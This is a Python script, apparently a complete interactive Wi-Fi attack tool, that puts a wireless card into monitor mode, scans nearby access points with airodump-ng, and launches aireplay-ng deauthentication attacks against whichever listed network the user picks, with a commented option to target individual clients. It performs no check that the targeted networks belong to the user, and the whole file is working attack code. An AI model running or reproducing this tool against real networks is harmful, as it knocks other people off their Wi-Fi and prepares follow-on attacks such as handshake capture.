import subprocess
import re
import time
import os
from datetime import datetime
import signal
import sys
from typing import Dict, Optional
import threading
from time import sleep

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

class WifiTester:
    def __init__(self):
        self.interface = None
        self.found_networks: Dict[str, dict] = {}
        self.current_process: Optional[subprocess.Popen] = None
        self.is_scanning = False
        self.deauth_processes: Dict[str, subprocess.Popen] = {}
        self.scan_duration = 30  # Default scan duration
        self.temp_dir = "/tmp/wifi_scan"
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════╗
║             WiFi Security Testing Tool           ║
║             -------------------------            ║
║                     Version 1.0                  ║
║        {Colors.RED}           Made By APentest1  {Colors.CYAN}              ║
╚══════════════════════════════════════════════════╝{Colors.END}
        """
        print(banner)

    def print_status(self, message: str, status_type: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {
            "info": Colors.BLUE,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED
        }.get(status_type, Colors.BLUE)
        print(f"{color}[{timestamp}] {message}{Colors.END}")

    def get_wireless_interfaces(self):
        interfaces = []
        try:
            output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT, text=True)
            for line in output.split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.append(interface)
        except subprocess.CalledProcessError:
            pass
        return interfaces

    def select_interface(self):
        interfaces = self.get_wireless_interfaces()
        if not interfaces:
            self.print_status("No wireless interfaces found!", "error")
            sys.exit(1)

        print(f"\n{Colors.CYAN}Available Wireless Interfaces:{Colors.END}")
        for idx, interface in enumerate(interfaces, 1):
            print(f"{Colors.YELLOW}{idx}{Colors.END}. {interface}")

        while True:
            try:
                choice = input(f"\n{Colors.GREEN}Select interface number [{1}-{len(interfaces)}]: {Colors.END}")
                idx = int(choice)
                if 1 <= idx <= len(interfaces):
                    self.interface = interfaces[idx-1]
                    self.print_status(f"Selected interface: {self.interface}", "success")
                    break
                else:
                    self.print_status("Invalid selection. Please try again.", "error")
            except ValueError:
                self.print_status("Please enter a valid number.", "error")

    def check_dependencies(self):
        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
        missing_tools = []
        
        for tool in required_tools:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            self.print_status("Missing required tools:", "error")
            for tool in missing_tools:
                print(f"{Colors.RED}• {tool}{Colors.END}")
            print(f"\n{Colors.YELLOW}Please install the aircrack-ng suite:{Colors.END}")
            print("sudo apt-get update && sudo apt-get install aircrack-ng")
            sys.exit(1)

    def configure_scan_duration(self):
        while True:
            try:
                duration = input(f"\n{Colors.GREEN}Enter scan duration in seconds (10-60) [{self.scan_duration}]: {Colors.END}")
                if not duration:
                    break
                duration = int(duration)
                if 10 <= duration <= 60:
                    self.scan_duration = duration
                    self.print_status(f"Scan duration set to {duration} seconds", "success")
                    break
                else:
                    self.print_status("Please enter a value between 10 and 60 seconds", "error")
            except ValueError:
                self.print_status("Please enter a valid number", "error")

    def enable_monitor_mode(self):
        self.print_status("Enabling monitor mode...", "info")
        try:
            subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], check=True)
            time.sleep(1)
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['sudo', 'iw', self.interface, 'set', 'monitor', 'none'], check=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
            
            # Verify monitor mode
            for _ in range(3):  # Try up to 3 times
                result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
                if 'Mode:Monitor' in result.stdout:
                    self.print_status(f"Interface {self.interface} is now in monitor mode", "success")
                    return True
                time.sleep(1)
                
            self.print_status("Failed to enable monitor mode", "error")
            return False
                
        except subprocess.CalledProcessError as e:
            self.print_status(f"Error enabling monitor mode: {str(e)}", "error")
            return False

    def start_deauth(self, bssid: str, network_info: dict):
        try:
            if bssid not in self.deauth_processes:
                # Switch to the network's channel before starting deauth
                channel = network_info.get('channel')
                if channel:
                    subprocess.run(['iw', self.interface, 'set', 'channel', channel], check=True)
                    self.print_status(f"Switched to channel {channel} for {network_info['essid']}", "info")

                # Deauth command with optional client targeting if known (e.g., broadcast)
                cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid, self.interface]
                
                # Uncomment the following lines to target a specific client if MAC is available
                # client_mac = "<client_mac_here>"  # Replace with actual MAC if needed
                # cmd.extend(['-c', client_mac])
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.deauth_processes[bssid] = process
                self.print_status(f"Started deauth attack on {network_info['essid']}", "success")
                return True
            else:
                self.print_status(f"Attack already running on {network_info['essid']}", "warning")
                return False
        except Exception as e:
            self.print_status(f"Error starting deauth for {bssid}: {str(e)}", "error")
            return False


    def stop_deauth(self, bssid: str, network_info: dict):
        try:
            if bssid in self.deauth_processes:
                process = self.deauth_processes[bssid]
                process.terminate()
                process.kill()  # Ensure the process is completely terminated
                process.wait()
                del self.deauth_processes[bssid]
                self.print_status(f"Stopped deauth attack on {network_info['essid']}", "warning")
                return True
            else:
                self.print_status(f"No active attack on {network_info['essid']}", "warning")
                return False
        except Exception as e:
            self.print_status(f"Error stopping deauth for {bssid}: {str(e)}", "error")
            return False


    def display_networks(self):
        os.system('clear')
        self.print_banner()
        if not self.found_networks:
            self.print_status("No networks found. Please run a scan first.", "warning")
            return

        print(f"\n{Colors.CYAN}Discovered Networks:{Colors.END}")
        print(f"{Colors.YELLOW}{'ID':3} {'Status':<8} {'ESSID':<32} {'BSSID':<18} {'Signal':>7} {'Channel':>8}{Colors.END}")
        print("─" * 80)
        
        for idx, (bssid, info) in enumerate(self.found_networks.items(), 1):
            status = "🟢" if bssid in self.deauth_processes else "🔴"
            essid = info['essid'][:30] + '..' if len(info['essid']) > 30 else info['essid']
            print(f"{idx:2d}  {status:<8} {essid:<32} {bssid:<18} {info['signal']:>7} {info['channel']:>8}")

        print("\n" + "─" * 80)
        print(f"{Colors.CYAN}Commands:{Colors.END}")
        print(f"  {Colors.YELLOW}[number]{Colors.END} - Start attack on network")
        print(f"  {Colors.YELLOW}s[number]{Colors.END} - Stop attack")
        print(f"  {Colors.YELLOW}r{Colors.END} - Rescan networks")
        print(f"  {Colors.YELLOW}d{Colors.END} - Change scan duration")
        print(f"  {Colors.YELLOW}q{Colors.END} - Return to main menu")

    def scan_networks(self):
        os.makedirs(self.temp_dir, exist_ok=True)
        output_file = f"{self.temp_dir}/scan"
        
        # Clean up old scan files
        for file in os.listdir(self.temp_dir):
            if file.startswith('scan'):
                os.remove(os.path.join(self.temp_dir, file))
        
        self.print_status(f"Starting {self.scan_duration} second network scan...", "info")
        print(f"\n{Colors.YELLOW}Press Ctrl+C to stop scanning early{Colors.END}\n")
        
        self.is_scanning = True
        self.current_process = subprocess.Popen(
            ['airodump-ng', '--write', output_file, '--output-format', 'csv', self.interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Progress bar
        for i in range(self.scan_duration):
            if not self.is_scanning:
                break
            progress = (i + 1) / self.scan_duration
            bar_length = 40
            filled_length = int(bar_length * progress)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            percent = progress * 100
            print(f'\r{Colors.CYAN}Scanning: |{bar}| {percent:.1f}%{Colors.END}', end='')
            time.sleep(1)
        print()  # New line after progress bar
        
        self.is_scanning = False
        self.current_process.terminate()
        self.current_process.wait()
        
        if os.path.exists(f"{output_file}-01.csv"):
            with open(f"{output_file}-01.csv", 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            networks_section = []
            for line in lines:
                if line.strip() and "Station MAC" not in line:
                    networks_section.append(line)
            
            self.found_networks.clear()
            for line in networks_section[1:]:  # Skip header
                fields = line.strip().split(',')
                if len(fields) >= 14:
                    bssid = fields[0].strip()
                    power = fields[8].strip()
                    channel = fields[3].strip()
                    essid = fields[13].strip().strip('"')
                    
                    if bssid and bssid != "BSSID":
                        self.found_networks[bssid] = {
                            'essid': essid if essid else '<Hidden Network>',
                            'signal': power if power else 'N/A',
                            'channel': channel if channel else 'N/A'
                        }
        
        self.print_status(f"Scan complete. Found {len(self.found_networks)} networks.", "success")

    def manage_attacks(self):
        while True:
            self.display_networks()
            if not self.found_networks:
                input(f"\n{Colors.YELLOW}Press Enter to return to main menu...{Colors.END}")
                return
                
            command = input(f"\n{Colors.YELLOW}Enter command:{Colors.END} ").strip().lower()
            
            if command == 'q':
                break
            elif command == 'r':
                self.scan_networks()
            elif command == 'd':
                self.configure_scan_duration()
            elif command.startswith('s'):
                try:
                    network_num = int(command[1:])
                    if 1 <= network_num <= len(self.found_networks):
                        bssid = list(self.found_networks.keys())[network_num - 1]
                        self.stop_deauth(bssid, self.found_networks[bssid])
                    else:
                        self.print_status("Invalid network number", "error")
                except ValueError:
                    self.print_status("Invalid network number", "error")
            elif command.isdigit():
                try:
                    network_num = int(command)
                    if 1 <= network_num <= len(self.found_networks):
                        bssid = list(self.found_networks.keys())[network_num - 1]
                        self.start_deauth(bssid, self.found_networks[bssid])
                    else:
                        self.print_status("Invalid network number", "error")
                except ValueError:
                    self.print_status("Invalid network number", "error")
            else:
                self.print_status("Invalid command", "error")
            
            sleep(1)  # Small delay to read status messages

    def disable_monitor_mode(self):
        self.print_status("Disabling monitor mode...", "info")
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'], check=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'], check=True)
            
            # Verify managed mode
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Managed' in result.stdout:
                self.print_status(f"Interface {self.interface} is back to managed mode", "success")
            else:
                self.print_status("Warning: Could not verify managed mode", "warning")
        except subprocess.CalledProcessError as e:
            self.print_status(f"Error disabling monitor mode: {str(e)}", "error")

    def show_main_menu(self):
        while True:
            os.system('clear')
            self.print_banner()
            print(f"1. Select Wireless Interface {f'({self.interface})' if self.interface else ''}")
            print("2. Configure Scan Duration")
            print("3. Start Network Scan")
            print("4. Manage Attacks")
            print("5. Exit")
            
            choice = input(f"\n{Colors.YELLOW}Enter your choice (1-5): {Colors.END}")
            
            if choice == '1':
                self.select_interface()
            elif choice == '2':
                self.configure_scan_duration()
            elif choice == '3':
                if not self.interface:
                    self.print_status("Please select an interface first", "error")
                    sleep(2)
                    continue
                self.scan_networks()
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
            elif choice == '4':
                if not self.interface:
                    self.print_status("Please select an interface first", "error")
                    sleep(2)
                    continue
                if not self.found_networks:
                    self.print_status("Please run a network scan first", "error")
                    sleep(2)
                    continue
                self.manage_attacks()
            elif choice == '5':
                break
            else:
                self.print_status("Invalid choice. Please try again.", "error")
                sleep(1)

    def run(self):
        try:
            self.check_dependencies()
            self.show_main_menu()
            if self.interface:
                self.cleanup()
            self.print_status("Exiting program...", "info")
        except KeyboardInterrupt:
            self.handle_exit(None, None)

    def cleanup(self):
        """Clean up all running processes and restore network settings"""
        self.print_status("Cleaning up...", "warning")
        self.is_scanning = False
        
        # Stop all deauth attacks
        for bssid, process in list(self.deauth_processes.items()):
            network_info = self.found_networks.get(bssid, {'essid': 'Unknown'})
            self.stop_deauth(bssid, network_info)
        
        # Stop scanning process if active
        if self.current_process:
            self.current_process.terminate()
            self.current_process.wait()
        
        # Disable monitor mode
        if self.interface:
            self.disable_monitor_mode()
        
        # Clean up temporary files
        if os.path.exists(self.temp_dir):
            try:
                for file in os.listdir(self.temp_dir):
                    os.remove(os.path.join(self.temp_dir, file))
                os.rmdir(self.temp_dir)
            except Exception as e:
                self.print_status(f"Error cleaning up temporary files: {str(e)}", "error")

    def handle_exit(self, signal, frame):
        """Handle graceful exit on SIGINT (Ctrl+C)"""
        print("\n")  # New line after ^C
        self.print_status("Shutting down gracefully...", "warning")
        self.cleanup()
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Colors.RED}This program must be run as root. Please use sudo.{Colors.END}")
        sys.exit(1)
        
    wifi_tester = WifiTester()
    signal.signal(signal.SIGINT, wifi_tester.handle_exit)
    wifi_tester.run()